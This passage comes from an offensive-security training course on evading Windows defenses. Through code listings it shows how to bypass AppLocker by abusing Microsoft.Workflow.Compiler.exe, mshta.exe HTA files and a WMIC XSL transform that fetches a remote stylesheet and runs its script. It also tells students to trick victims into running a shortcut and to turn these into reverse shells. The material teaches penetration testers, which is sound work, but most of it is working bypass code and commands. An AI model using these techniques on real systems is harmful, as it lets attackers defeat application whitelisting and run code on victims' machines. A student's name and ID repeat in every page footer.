9   CompilerInput compilerInput = Program.ReadCompilerInput(args[0]); 
10      WorkflowCompilerResults results = new 
WorkflowCompiler().Compile(MultiTargetingInfo.MultiTargetingUtilities.RenormalizeRefer
encedAssemblies(compilerInput.Parameters), compilerInput.Files); 
11    Program.WriteCompilerOutput(args[1], results); 
12  } 
Listing 364 - Main method of Microsoft.Workflow.Compiler.exe 
This reveals that two arguments must be passed and that only the first is used with the Compile 
method. The contents of the first argument are parsed by the ReadCompilerInput method, which 
returns an object that contains compiler parameters and file names. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
297 
The information discovered here is very enlightening. It tells us that any input to Compile should 
be under user control. However the input does go through some sort of validation via 
ReadCompilerInput. 
Listing 365 shows the content of ReadCompilerInput, where we find that the content of the file 
passed as an argument is read into a stream, after which it is used to create an XmlReader466 
stream. This shows us that we must supply an XML file as the first argument to 
Microsoft.Workflow.Compiler. 
26  private static CompilerInput ReadCompilerInput(string path) 
27  { 
28    CompilerInput result = null; 
29    using (Stream stream = new FileStream(path, FileMode.Open, FileAccess.Read, 
FileShare.Read)) 
30      { 
31        XmlReader reader = XmlReader.Create(stream); 
32        result = (CompilerInput)new 
DataContractSerializer(typeof(CompilerInput)).ReadObject(reader); 
33      } 
34      return result; 
35  } 
Listing 365 - ReadCompilerInput parses the supplied file 
After the XmlReader stream is created, the ReadObject467 method is used to deserialize the data 
of the stream and return it as the CompilerInput type, which is a custom type defined inside 
Microsoft.Workflow.Compiler. If we click on the type, we find that it contains only two elements: 
parameters and files. 
At this point, it seems that we should be able to pass a file of our own choosing to 
Microsoft.Workflow.Compiler as the first argument. However the file must contain serialized XML 
data. 
While it is not yet clear what the content of the file should be and how the deserialization works, 
we have found that we should be able to trigger execution of Compile with arguments under our 
control. 
There is still much work left to do in this analysis. Simply compiling C# code and loading an 
assembly into memory is not enough to acquire code execution. In the next section, we must 
continue our reverse engineering to determine whether or not the newly-compiled assembly is 
actually executed. 
8.4.2.1 Exercises 
1. 
Repeat the steps in this section to locate the call to Assembly.Load. 
2. 
Locate the application we can use to invoke Compile and discover how its arguments are 
controlled. 
 
466 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmlreader?view=netframework-4.8 
467 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.serialization.datacontractserializer.readobject?view=netframework-
4.8#System_Runtime_Serialization_DataContractSerializer_ReadObject_System_Xml_XmlReader_ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
298 
8.4.3 Give Me Code Exec 
In this section, we are going to continue our reverse engineering session to discover how we can 
obtain code execution under specific circumstances. 
During our analysis in the previous section, we followed the code path starting from the Compile 
method 
of 
the 
WorkflowCompilerInternal 
namespace. 
The 
code 
trace 
led 
us 
to 
GenerateLocalAssembly which in theory should allow us to compile and subsequently load an 
arbitrary assembly. Now we’ll analyze InternalCompileFromDomBatch which follows after the 
GenerateLocalAssembly call as noted below. 
89  using (WorkflowCompilationContext.CreateScope(serviceContainer, parameters)) 
90  { 
91    parameters.LocalAssembly = this.GenerateLocalAssembly(array, array2, parameters, 
workflowCompilerResults, out tempFileCollection, out empty, out text4); 
92      if (parameters.LocalAssembly != null) 
93      { 
94        referencedAssemblyResolver.SetLocalAssembly(parameters.LocalAssembly); 
95          typeProvider.SetLocalAssembly(parameters.LocalAssembly); 
96          typeProvider.AddAssembly(parameters.LocalAssembly); 
97          workflowCompilerResults.Errors.Clear(); 
98          XomlCompilerHelper.InternalCompileFromDomBatch(array, array2, parameters, 
workflowCompilerResults, empty); 
99      } 
100 } 
Listing 366 - Call to GenerateLocalAssembly and InternalCompileFromDomBatch 
Before 
following 
the 
call 
into 
InternalCompileFromDomBatch, 
we 
notice 
that 
GenerateLocalAssembly returns the newly compiled and loaded assembly inside the 
LocalAssembly property of the parameters variable. A reference to the assembly is subsequently 
stored in the typeProvider variable. 
When we follow the call into InternalCompileFromDomBatch we are lead into the 
XomlCompilerHelper namespace. After some argument validation and variable initialization, we 
find the foreach loop shown in Listing 367. 
52  foreach (Type type in typeProvider.LocalAssembly.GetTypes()) 
53  { 
54    if (TypeProvider.IsAssignable(typeof(Activity), type) && !type.IsAbstract) 
55      { 
... 
Listing 367 - Foreach loop detecting all classes of type Activity 
The loop iterates over all classes in the previously compiled file as given by the reference stored 
in the typeProvider variable. For each iteration it checks for classes which inherit468 from 
System.Workflow.ComponentModel.Activity and are not abstract.469 
Assuming at least one such class exists, we go into the loop where the CreateInstance470 method 
is invoked, which instantiates an object of the given type: 
 
468 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/csharp/tutorials/inheritance 
469 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/abstract 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
299 
108 try 
109 { 
110   Activity.ActivityType = type; 
111   activity = (Activator.CreateInstance(type) as Activity); 
112 } 
Listing 368 - Objects of type Activity are instantiated 
When an object is instantiated from a class, the defined constructor is executed. 
Our hypothesis is that the Compile method of the Compiler.WorkflowCompiler namespace is 
called with the path of a file containing C# source code given as an argument. After several 
iterations of validation and parsing, the provided .NET code is compiled into an assembly, loaded 
into memory, and if it contains a non-abstract class which inherits from the Activity type, an 
object is instantiated. 
If we are able to provide our desired code as part of the constructor for that class, we can obtain 
arbitrary code execution and bypass AppLocker. 
This concludes the second stage of reverse engineering. We have located a theoretical path that 
will lead to code execution. Now we must discover how to provide proper input to the constructor. 
8.4.3.1 Exercise 
1. 
Repeat the analysis in dnSpy to discover the loop that will instantiate a class from our code. 
8.4.4 Invoking the Target Part 1 
In this and the next section, we must finish our reverse engineering and create proof-of-concept 
bypass code. We have already found that the native Microsoft.Workflow.Compiler application 
can be used to invoke the Compile method with arguments supplied on the command line. 
The first command-line argument is a file path which is parsed by the ReadCompilerInput method. 
We must inspect the ReadCompilerInput method to determine what the file format and content of 
the first command line argument should be. 
We previously found that ReadCompilerInput creates a XmlReader stream after which the 
ReadObject471 method is used to deserialize the data of the stream and return it as the type 
CompilerInput. This code is repeated in Listing 369 
26  private static CompilerInput ReadCompilerInput(string path) 
27  { 
28    CompilerInput result = null; 
29    using (Stream stream = new FileStream(path, FileMode.Open, FileAccess.Read, 
FileShare.Read)) 
30      { 
31        XmlReader reader = XmlReader.Create(stream); 
32        result = (CompilerInput)new 
DataContractSerializer(typeof(CompilerInput)).ReadObject(reader); 
 
470 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.activator.createinstance?view=netframework-4.8 
471 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.serialization.datacontractserializer.readobject?view=netframework-
4.8#System_Runtime_Serialization_DataContractSerializer_ReadObject_System_Xml_XmlReader_ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
300 
33      } 
34      return result; 
35  } 
Listing 369 - ReadComplerInput parses the supplied file 
To build upon this knowledge we must understand both the content of the serialized XML file and 
the deserialization process. 
In the listing above, ReadObject makes use of the DataContractSerializer472 method to aid in the 
serialization. This is in line with the MSDN documentation which reveals that a similar 
serialization process would use DataContractSerializer along with WriteObject.473 At this point, to 
understand how to successfully serialize our input we could either reverse engineer all the 
required flags, or we could attempt to locate code related to serialization inside the assembly. 
We choose to do the latter and right-click DataContractSerializer and select “Analyze”, which tells 
us that it is only used in two methods as shown in Figure 110. 
 
Figure 110: Uses of DataContractSerializer 
Besides the ReadCompilerInput method we are currently investigating, DataContractSerializer is 
only used in SerializeInputToWrapper, which has a very promising name. 
Double-clicking the method name reveals its body: 
104 private static string SerializeInputToWrapper(WorkflowCompilerParameters 
parameters, string[] files) 
105 { 
106   string tempFileName = Path.GetTempFileName(); 
107   using (Stream stream = new FileStream(tempFileName, FileMode.Create, 
FileAccess.Write, FileShare.Read)) 
108   { 
109       using (XmlWriter xmlWriter = XmlWriter.Create(stream, new XmlWriterSettings 
110         { 
111           Indent = true 
112         })) 
113       { 
114       CompilerInput graph = new 
CompilerInput(MultiTargetingInfo.MultiTargetingUtilities.NormalizeReferencedAssemblies
(parameters), files); 
115         new DataContractSerializer(typeof(CompilerInput)).WriteObject(xmlWriter, 
graph); 
116     } 
 
472 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.serialization.datacontractserializer?view=netframework-4.8 
473 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.serialization.datacontractserializer.writeobject?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
301 
117   } 
118   return tempFileName; 
119 } 
Listing 370 - SerializeInputToWrapper serializes its input 
The highlighted portion of the code shows a serialization process similar to the one encountered 
in ReadCompilerInput. 
This code is perfect for our purposes since it serializes a data object of type 
WorkflowCompilerParameters into an XML file on the filesystem. 
Since we have found a method that directly serializes into our desired format, we can simply 
create a PowerShell script that calls it.474 
Because the method is private, we must use reflection to locate it with GetMethod as shown in 
Listing 371. 
$workflowexe = 
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe" 
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe) 
$SerializeInputToWrapper = 
[Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', 
[Reflection.BindingFlags] 'NonPublic, Static') 
Listing 371 - Locating SerializeInputToWrapper through reflection 
With the method resolved, we must determine which arguments it accepts. The first are the 
WorkflowCompilerParameters. Fortunately, the type is public, meaning we can simply instantiate 
an object of this type. The second argument is an array of strings containing file paths. 
Once we have set up the argument values, we can call the method through reflection with the 
Invoke method: 
Add-Type -Path 
'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll' 
$compilerparam = New-Object -TypeName 
Workflow.ComponentModel.Compiler.WorkflowCompilerParameters 
$pathvar = "test.txt" 
$output = "C:\Tools\test.xml" 
$tmp = $SerializeInputToWrapper.Invoke($null, 
@([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, 
[String[]] @(,$pathvar))) 
Move-Item $tmp $output 
Listing 372 - Defining arguments and calling SerializeInputToWrapper 
After executing the code, we can dump the contents of the generated file to view the serialized 
content: 
PS C:\Tools> type C:\Tools\test.xml 
<?xml version="1.0" encoding="utf-8"?> 
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" 
xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"> 
 
474 (Matt Graeber, 2018), https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-
3d9294bc5efb 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
302 
  <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays"> 
    <d2p1:string>test.txt</d2p1:string> 
  </files> 
  <parameters 
xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Com
piler"> 
    <assemblyNames 
xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" 
xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /> 
    <compilerOptions i:nil="true" 
xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /> 
    <coreAssemblyFileName 
xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssembly
FileName> 
... 
Listing 373 - Contents of serialized XML file generated by SerializeInputToWrapper 
Note that the XML file was generated from an administrative PowerShell console 
in the context of the “Offsec” user to avoid AppLocker. This means that the 
“student” user cannot access it before we modify the file permissions. 
We notice two things from the contents of the file. First, the file path we supplied has been 
embedded into it and will be used with the call to Compile once the file is deserialized. Second, 
quite a few compiler flags have been added, but at this time we do not know if the values they 
contain will lead us down the correct code path in order to process and execute an arbitrary 
malicious assembly file. 
With an understanding of how we can generate an input file that will be deserialized correctly by 
Microsoft.Workflow.Compiler, we must return to dnSpy. Our goal is to determine what file format 
and content the file name embedded in the XML file should have, and which compiler flags are 
required to reach the compilation, loading, and subsequent execution sections. 
After returning to the Main method of Microsoft.Workflow.Compiler in dnSpy, we find that the 
next call is to Compile, where the deserialized parameters and file names are supplied as 
arguments. 
3 private static void Main(string[] args) 
4 { 
5   if (args == null || args.Length != 2) 
6   { 
7     throw new ArgumentException(WrapperSR.GetString("InvalidArgumentsToMain"), 
"args"); 
8   } 
9   CompilerInput compilerInput = Program.ReadCompilerInput(args[0]); 
10  WorkflowCompilerResults results = new 
WorkflowCompiler().Compile(MultiTargetingInfo.MultiTargetingUtilities.RenormalizeRefer
encedAssemblies(compilerInput.Parameters), compilerInput.Files); 
12  Program.WriteCompilerOutput(args[1], results); 
13  } 
Listing 374 - Main method of Microsoft.Workflow.Compiler.exe 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
303 
We follow the call and first notice null checks on the input values after which various actions are 
performed depending on the given parameters: 
12 public WorkflowCompilerResults Compile(WorkflowCompilerParameters parameters, 
params string[] files) 
13 { 
... 
32   if (parameters.GenerateInMemory) 
33   { 
34     flag = true; 
35     parameters.GenerateInMemory = false; 
36       if (string.IsNullOrEmpty(parameters.OutputAssembly)) 
37       { 
38         text2 = Path.GetTempFileName(); 
39           parameters.OutputAssembly = text2 + ".dll"; 
40       } 
41   else 
... 
Listing 375 - Parameters GenerateInMemory and OutputAssembly being used 
The OutputAssembly parameter is only checked and modified if the GenerateInMemory flag is set. 
From our generated XML file, we find that it is set to false by default. The OutputAssembly 
parameter is likely the file name and path of the generated assembly file, and if it does not exist, 
the compilation will likely fail. 
Because of this, we must update our PowerShell script to set GenerateInMemory to true. This is 
shown in Listing 376. 
$compilerparam.GenerateInMemory = $True 
Listing 376 - Setting GenerateInMemory parameter to true 
After parsing the parameter, we follow the call into the Compile method of the 
WorkflowCompilerInternal namespace, where we find the following foreach loop: 
32  foreach (string text in allFiles) 
33  { 
34    if (text.EndsWith(".xoml", StringComparison.OrdinalIgnoreCase)) 
35      { 
36        stringCollection.Add(text); 
37      } 
38      else 
39      { 
40        stringCollection2.Add(text); 
41      } 
42  } 
43  string[] array = new string[stringCollection.Count]; 
44  stringCollection.CopyTo(array, 0); 
45  string[] array2 = new string[stringCollection2.Count]; 
46  stringCollection2.CopyTo(array2, 0); 
Listing 377 - Detecting files with xoml extension 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
304 
Very interestingly, we find a comparison on the file name against the xoml extension, which is 
used by the relatively undocumented Extensible Object Markup Language475 file format. This is 
essentially an XML document that can contain embedded code. 
File names with xoml extensions will be added to the array variable while file names with other 
extensions will be added to array2. Since xoml files can contain embedded code, we can assume 
that this is a required file, but we must continue our analysis to prove this. 
From our investigation in the previous sections, we located the code path to trigger the 
compilation and loading of the assembly and discovered that we must trace into the call to 
GenerateLocalAssembly, which was supplied the arguments shown in Listing 378. 
91  parameters.LocalAssembly = this.GenerateLocalAssembly(array, array2, parameters, 
workflowCompilerResults, out tempFileCollection, out empty, out text4); 
Listing 378 - Call to GenerateLocalAssembly with file names 
Once inside the call, we can inspect the function prototype of GenerateLocalAssembly to gain a 
better and somewhat contradictory understanding of the arguments: 
183 private Assembly GenerateLocalAssembly(string[] files, string[] codeFiles, 
WorkflowCompilerParameters parameters, WorkflowCompilerResults results, out 
TempFileCollection tempFiles2, out string localAssemblyPath, out string 
createdDirectoryName) 
Listing 379 - Comparing first two argument names with the supplied input 
From the argument names, we find that the files with an xoml extension are called files, while 
those with any other extension are called codeFiles, which leads us to believe we should avoid 
xoml files. This seems contradictory to the previous analysis. 
To understand this, we’ll turn our attention to the first call inside the method, which is to 
GenerateCodeFromFileBatch: 
188 CodeCompileUnit value = WorkflowCompilerInternal.GenerateCodeFromFileBatch(files, 
parameters, results); 
Listing 380 - Call to GenerateCodeFromFileBatch 
Listing 380 shows that this method is given the files variable, which contained the xoml files, as 
its first argument. If we were to reverse engineer the method, we would discover rather extensive 
code designed to parse the files and detect and extract embedded code. 
Still inside GenerateLocalAssembly, GenerateCodeFromFileBatch returns the embedded code from 
the xoml files into the value variable. Near the end of the method, we find the following code 
block: 
286 ArrayList arrayList2 = new 
ArrayList((ICollection)parameters.UserCodeCompileUnits); 
287 arrayList2.Add(value); 
288 ArrayList arrayList3 = new ArrayList(); 
289 arrayList3.AddRange(codeFiles); 
290 arrayList3.AddRange(XomlCompilerHelper.GenerateFiles(codeDomProvider, 
compilerParameters, (CodeCompileUnit[])arrayList2.ToArray(typeof(CodeCompileUnit)))); 
 
475 (Wiki, 2020), https://wiki.fileformat.com/web/xoml/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
305 
291 CompilerResults compilerResults = 
codeDomProvider.CompileAssemblyFromFile(compilerParameters, 
(string[])arrayList3.ToArray(typeof(string))); 
Listing 381 - All files containing code are passed to CompileAssemblyFromFile 
The files containing code that were extracted from an xoml file are added into the arrayList2 
variable, and those without this extension are added into the arrayList3 variable. In the second-to-
last line of code, the extracted code is converted to files and added to arrayList3. 
In effect, this means that we do not have to worry about the partially-undocumented xoml format 
and can instead simply provide a file containing C# code with an arbitrary extension. 
To summarize what we have discovered so far, Microsoft.Workflow.Compiler accepts two 
arguments. The first must be the path to an XML file containing compiler flags and the path to a 
file containing C# code. The C# file will be compiled and loaded into memory without restrictions. 
8.4.4.1 Exercises 
1. 
Repeat the analysis performed in this section to obtain a valid XML file with the PowerShell 
script. 
2. 
Modify the PowerShell script to set the GenerateInMemory flag and obtain a usable XML file. 
8.4.5 Invoking the Target Part 2 
We have managed to create a valid input file in XML format that will be processed by 
Microsoft.Workflow.Compiler and used to compile and load our C# code. Now we must finish 
the work and figure out how we can achieve execution of the newly compiled code. 
In InternalCompileFromDomBatch we find a check for classes that extend on the Activity as 
repeated in Listing 382. 
52  foreach (Type type in typeProvider.LocalAssembly.GetTypes()) 
53  { 
54    if (TypeProvider.IsAssignable(typeof(Activity), type) && !type.IsAbstract) 
55    { 
... 
108     try 
109     { 
110       Activity.ActivityType = type; 
111       activity = (Activator.CreateInstance(type) as Activity); 
112     } 
... 
Listing 382 - Objects that inherit from type Activity are instantiated 
Each located class will subsequently be instantiated to an object through the CreateInstance 
method by invoking the default constructor for the class. 
This means that the file containing code we provide must contain a class that inherits from the 
Activity class of the System.Workflow.ComponentModel namespace and must contain the code 
we want to execute inside its constructor. Proof-of-concept code is shown in Listing 383. 
using System; 
using System.Workflow.ComponentModel; 
public class Run : Activity{ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
306 
    public Run() { 
        Console.WriteLine("I executed!"); 
    } 
} 
Listing 383 - Proof of concept code as input file 
We have now managed to reverse engineer and develop the required input files to achieve code 
execution. There is, however, one missing step. 
We determined that Microsoft.Workflow.Compiler required two arguments as shown again in 
Listing 384: 
3 private static void Main(string[] args) 
4 { 
5   if (args == null || args.Length != 2) 
6   { 
7     throw new ArgumentException(WrapperSR.GetString("InvalidArgumentsToMain"), 
"args"); 
8   } 
9   CompilerInput compilerInput = Program.ReadCompilerInput(args[0]); 
10  WorkflowCompilerResults results = new 
WorkflowCompiler().Compile(MultiTargetingInfo.MultiTargetingUtilities.RenormalizeRefer
encedAssemblies(compilerInput.Parameters, compilerInput.Files); 
11  Program.WriteCompilerOutput(args[1], results); 
12  } 
Listing 384 - Main method of Microsoft.Workflow.Compiler.exe 
The second command line argument is only used with the WriteCompilerOutput method. 
Following that call, dnSpy reveals the following: 
3   private static void WriteCompilerOutput(string path, WorkflowCompilerResults 
results) 
4   { 
5     using (Stream stream = new FileStream(path, FileMode.Create, FileAccess.Write, 
FileShare.None)) 
6     { 
7       using (XmlWriter xmlWriter = XmlWriter.Create(stream, new XmlWriterSettings 
8         { 
9           Indent = true 
10          })) 
11        { 
12          NetDataContractSerializer netDataContractSerializer = new 
NetDataContractSerializer(); 
13          SurrogateSelector surrogateSelector = new SurrogateSelector(); 
14          surrogateSelector.AddSurrogate(typeof(MemberAttributes), 
netDataContractSerializer.Context, new CompilerResultsSurrogate()); 
15          ((IFormatter)netDataContractSerializer).SurrogateSelector = 
surrogateSelector; 
16          netDataContractSerializer.WriteObject(xmlWriter, results); 
17        } 
18    } 
19  } 
Listing 385 - Second command line argument is the output file path 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
307 
As highlighted in Listing 385, the argument is used as a file path, and content is written to it in 
XML format. Since we only care about obtaining code execution, we can simply pass a random 
file name as the second command line argument. 
This concludes our analysis and we now have all the information we need. 
In summary, we must craft a file containing C# code, which implements a class that inherits from 
the Activity class and has a constructor. The file path must be inserted into the XML document 
along with compiler parameters organized in a serialized format. 
To 
create 
this 
correctly-serialized 
XML 
format, 
we’ll 
take 
advantage 
of 
the 
SerializeInputToWrapper method in a PowerShell script: 
$workflowexe = 
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe" 
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe) 
$SerializeInputToWrapper = 
[Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', 
[Reflection.BindingFlags] 'NonPublic, Static') 
Add-Type -Path 
'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll' 
$compilerparam = New-Object -TypeName 
Workflow.ComponentModel.Compiler.WorkflowCompilerParameters 
$compilerparam.GenerateInMemory = $True 
$pathvar = "test.txt" 
$output = "C:\Tools\run.xml" 
$tmp = $SerializeInputToWrapper.Invoke($null, 
@([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, 
[String[]] @(,$pathvar))) 
Move-Item $tmp $output 
Listing 386 - Creating correctly serialized XML file using PowerShell 
Next, we need to ensure the student is able to access the generated file: 
PS C:\Tools> $Acl = Get-ACL $output;$AccessRule= New-Object 
System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”non
e","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl 
Listing 387 - Granting the student user permissions on the newly generated file 
With everything in place, we can run the executable with the two input arguments as shown in 
Listing 388. 
C:\Tools>C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.e
xe run.xml results.xml 
I executed! 
Listing 388 - Executing the proof of concept 
The output reveals that that our efforts were successful. We executed arbitrary C# code. 
Excellent! 
In this section, we have completed our analysis and investigation of the chosen assembly and in 
the process, created a working AppLocker bypass for managed code. The downside to this attack 
is that we must provide both the XML file and the C# code file on disk, and the C# code file will be 
compiled temporarily to disk as well. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
308 
Despite these limitations, this simple code can be applied to any existing C# tradecraft. 
8.4.5.1 Exercises 
1. 
Repeat the analysis performed in this section and obtain a proof-of-concept application 
whitelisting bypass. 
2. 
Modify the provided code file to invoke SharpUp,476 which is the C# equivalent to PowerUp. 
Attempt to create the attack in a way that does not require SharpUp to be written to disk on 
the victim machine. 
8.4.5.2 Extra Mile 
Perform online research to understand and execute an AppLocker bypass that allows arbitrary C# 
code execution by abusing the MSBuild477 native binary. 
8.5 Bypassing AppLocker with JScript 
Throughout this course we have primarily leveraged Microsoft Office and Jscript files to obtain 
client-side code execution. Along the way, we have greatly improved our tradecraft to bypass 
endpoint protections, and we have found a way to reuse all of that tradecraft with Microsoft 
Office. 
Due to the scripting rules imposed by AppLocker, Jscript code which is not located in a 
whitelisted folder or whitelisted through a file hash or signature will be blocked. For example, if we 
attach a Jscript file to an email or deliver it through an HTML smuggling attack, the execution will 
be blocked by AppLocker, disrupting our attack. 
In the next sections, we will reuse our Jscript and DotNetToJscript tradecraft and modify it to 
bypass AppLocker. 
8.5.1 JScript and MSHTA 
The MSHTA client side attack vector is well-known but works best against Internet Explorer. As 
Internet Explorer becomes less-used, this vector will become less relevant, but we’ll nonetheless 
reinvent it to bypass AppLocker and execute arbitrary Jscript code. 
First, we’ll briefly describe the MSHTA attack and provide context for an AppLocker bypass. 
Microsoft HTML Applications478 (MSHTA) work by executing .hta files with the native mshta.exe 
application. HTML Applications include embedded Jscript or VBS code that is parsed and 
executed by mshta.exe. 
Since mshta.exe is located in C:\Windows\System32 and is a signed Microsoft application, it is 
commonly whitelisted. Because of this, we can execute our Jscript code with mshta.exe instead 
of wscript.exe, and subsequently, bypass application whitelisting. 
A very simple HTA file containing Jscript code is shown in Listing 389. 
 
476 (@HarmJ0y, 2018), https://github.com/GhostPack/SharpUp/ 
477 (Microsoft, 2016), https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2019 
478 (Microsoft, 2013), https://docs.microsoft.com/en-us/previous-versions/ms536495(v%3Dvs.85) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
309 
<html>  
<head>  
<script language="JScript"> 
var shell = new ActiveXObject("WScript.Shell"); 
var res = shell.Run("cmd.exe"); 
</script> 
</head>  
<body> 
<script language="JScript"> 
self.close(); 
</script> 
</body>  
</html> 
Listing 389 - Proof of concept HTA file 
When executed by mshta.exe, the Jscript code inside both the head and the body tags will be 
executed, a command prompt will be spawned and the mshta.exe window will be closed. When 
we save this code to a local file and execute it from the command line, we observe that it does 
indeed bypass AppLocker: 
 
Figure 111: Bypassing AppLocker with mshta.exe 
This effectively re-invigorates our Jscript tradecraft! We can deliver this in a few different ways. 
For example, we could attach it to an email, or HTML-smuggle the file through a browser. Either 
way, the user must be tricked into running it to execute our code. In our case, we will create a 
shortcut file and store our .hta file on our Apache webserver. 
To create the shortcut file, we’ll right-click the desktop on the Windows 10 victim machine and 
navigate to New -> Shortcut. In the new window, we’ll enter the MSHTA executable path 
(C:\Windows\System32\mshta.exe) followed by the URL of the .hta file on our Kali machine: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
310 
 
Figure 112: Shortcut file using mshta 
To create it, we’ll click “Next” and name it. Once test.hta is transferred to our Kali machine, we can 
double-click the shortcut file to execute our Jscript code. 
Note that mshta.exe will download the .hta file before its execution, so we must 
still bypass any installed endpoint detection software. 
As a final step of this weaponization, we can bring back the Jscript code generated with 
DotNetToJscript and embed it in the hta file to obtain a reverse shell by only sending the victim a 
shortcut file. 
8.5.1.1 Exercises 
1. 
Create and execute the proof of concept hta file to bypass AppLocker and obtain Jscript 
code execution. 
2. 
Use SharpShooter to generate a Jscript shellcode runner inside a hta file and use it to gain a 
reverse shell. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
311 
8.5.2 XSL Transform 
It’s beneficial to prepare multiple bypasses in the event one is blocked. In this section, we’ll 
demonstrate a second way of obtaining arbitrary Jscript execution while bypassing AppLocker 
through XSL transformation (XSLT).479 
The process of XSLT uses Extensible Stylesheet Language (.xsl) documents to transform an XML 
document into a different format such as XHTML. 
Part of the XSL transformation480 specification allows execution of embedded Jscript code when 
processing the supplied XML document. Security researchers have discovered an XSL 
transformation attack (Squiblytwo481) that allows arbitrary code execution when triggered. 
To leverage this, we must first craft a malicious XSL document and put it on our Apache 
webserver. As a proof of concept, we are going to launch a command prompt through the 
document shown in Listing 390: 
<?xml version='1.0'?> 
<stylesheet version="1.0" 
xmlns="http://www.w3.org/1999/XSL/Transform" 
xmlns:ms="urn:schemas-microsoft-com:xslt" 
xmlns:user="http://mycompany.com/mynamespace"> 
 
<output method="text"/> 
    <ms:script implements-prefix="user" language="JScript"> 
        <![CDATA[ 
            var r = new ActiveXObject("WScript.Shell"); 
            r.Run("cmd.exe"); 
        ]]> 
    </ms:script> 
</stylesheet> 
Listing 390 - Proof of concept XSL file that will open cmd.exe 
Once the file is created, we must download it and invoke a transform to trigger the Jscript code. 
This may be done through the WMI command-line utility (WMIC)482 by specifying the verb get 
and the /format: switch followed by the URL of the XSL file, as shown in Listing 391. 
wmic process get brief /format:"http://192.168.119.120/test.xsl" 
Listing 391 - WMIC is used to trigger the XSL transform 
Once the command is executed from a command prompt, a new command prompt is opened, 
proving that our Jscript code executed as shown in Figure 113. 
 
479 (Wikipedia, 2020), https://en.wikipedia.org/wiki/XSL 
480 (w3.org, 2020), https://www.w3.org/TR/xslt-30/ 
481 (Mitre, 2020), https://attack.mitre.org/techniques/T1220/ 
